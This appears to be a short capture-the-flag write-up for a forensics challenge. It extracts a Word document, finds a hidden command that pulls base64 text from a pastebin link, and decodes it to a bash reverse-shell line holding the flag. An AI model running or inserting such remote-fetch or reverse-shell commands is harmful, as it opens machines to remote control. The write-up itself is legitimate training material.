## Description

Can you help me out by find the flag in this document?

## Writeup

Starting off, I extracted all elements using basic linux utility. <br/>
```sh
$ binwalk -e EmuWar.docx 
```

Searching through extracted files using linux utility. <br/>
```sh
$ find ./ -type f -exec strings {} + | grep "DU"
$ find ./ -type f -exec strings {} + | grep http

--------------------
curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d

```

To extract the flag I simply used another `curl` request to the used endpoint which concludes this writeup. <br/>
```sh
$ curl https://pastebin.com/raw/ysYcKmbu | base64 -d

bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3} 0>&1
